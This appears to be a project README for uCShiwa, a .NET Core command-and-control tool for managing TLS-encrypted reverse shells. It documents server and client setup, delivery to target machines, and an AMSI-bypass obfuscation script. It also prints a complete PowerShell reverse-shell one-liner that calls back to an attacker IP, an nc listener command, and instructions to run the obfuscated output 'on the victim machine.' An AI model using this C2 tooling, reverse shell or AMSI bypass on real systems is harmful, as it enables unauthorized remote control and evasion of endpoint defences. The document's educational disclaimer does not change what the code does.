# uCShiwa

.NET Core light C2 Unit:

- Manage multiple revershells
- Use TLS and command obfuscation
- Keep It Simple, Stupid

This tool is presented for educational purpose.
It was used in real security tests and in advenced penetration testing labs (2020-2022).

## Disclaimer

Usage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site. This tools is provided "as is" without warranty of any kind.

## Help & Documentation

Execute it without any options to print help

## Server

```shell
Ucshiwa.exe <port> <certificate.pfx> <passwd>

<0> Server mode
<0> Port: 4444
Cipher: Aes256
Hash: Sha384
Protocol: Tls12

<0> 10.10.10.10:1234 > (Your command)
```

## ReverseShell

```shell
Ucshiwa.exe <ip> <port>

<0> Reverse Shell mode
<0> Ip: 10.10.10.10
<0> Port: 4444
CN:CN=...
ExpirDate:...
PubKey:....
```

## Mutli-Client

Several revershells can be used on the same server (IP:port): 

- Clients connect periodically
- The first connected, the first tasked.
- The `exit` command allows you to change session
- The `bg` command allows you to run command in background and change session

## Encrytion

TLS 1.2

Consider the default `cert.pfx` file as compromised (password: ucshiwa). A quick way to generate your own is the `New-SelfSignedCertificate`:

```powershell
New-SelfSignedCertificate -DnsName Ucshiwa.lan -CertStoreLocation Cert:\CurrentUser\My\  -KeyAlgorithm RSA -KeyLength 4096 -NotAfter $(Get-Date).AddYears(30)
certmgr.msc # export the generated certificate as password protected .pfx file 
```

## Obfuscation

This is the default behavior, feel free to adapt the source code:

- Powershell is embeded in windows/linux clients (many libs but no child process creation)
- On server side, put `Shellingan.ps1` in the same directory to automatically perform command obfuscation (AMSI bypass)

## Authentication

Certificate is manualy validated during the revershell connection

## Multi-Platform

- Windows: `dotnet publish --self-contained true`
- Linux: `dotnet publish -r linux-x64 --self-contained true`

## Delivery

Unzip it on the target machine with the `Expand-Archive` cmdlet

## To use Shellingan.ps1 as a standalone script for AMSI Bypass

### Import

```powershell
. .\shellingan.ps1
```

### Options

```console
-cmd: command obfuscation
-iex: add invoke-expression
-recurse: number of obfuscation loop
```

### Exemple

From your attack machine:
```console
nc64.exe -lnvp <port>
```


```powershell
Invoke-Shellingan -iex $true -cmd '$c=nEw-ObjeCt SYsTEm.nET.SOcKetS.tcpcLIENT((wRiTe-oUtpuT <ip>),<port>);$s=$c.gETsTrEaM();[BYtE[]]$b=0..65535|%{0};wHILe(($i=$s.rEAd($b,0,$b.LENgTh))-NE0){$a=(NEw-oBJeCT -tYPenAME sYSteM.tEXT.aScIieNcOdInG).gETsTRIng($b,0,$i);$k=(iEX $a 2>&1|oUt-stRInG);$z=$k+(WrITe-OuTPut `>);$d=([teXT.eNcODiNg]::aSCii).gETByTEs($z);$s.wRiTE($d,0,$d.LEnGtH);$s.fLuSH()};$c.cLoSE()'
```

output:
```powershell
$186=255;$208=[SYStEM.TexT.ENCoDiNg];$102=$208::Utf8.gETByTeS('');$208::AsCii.GetString($(([bytE]55,86,80,97...
```
Execute the output on the victim machine to get your reverse shell

## Misc

this project contains also an exemple of how obfuscate Sharphound (BloodHound ingestor)

## Love uCShiwa ? 

Help me to keep uCShiwa free and open-source

* [Ethereum Donation](https://etherscan.io/address/0xcC424e30Ff6eEAb4E6B3A900c5446038F858b314)
* [buy me a coffee](https://www.buymeacoffee.com/taisensolutions)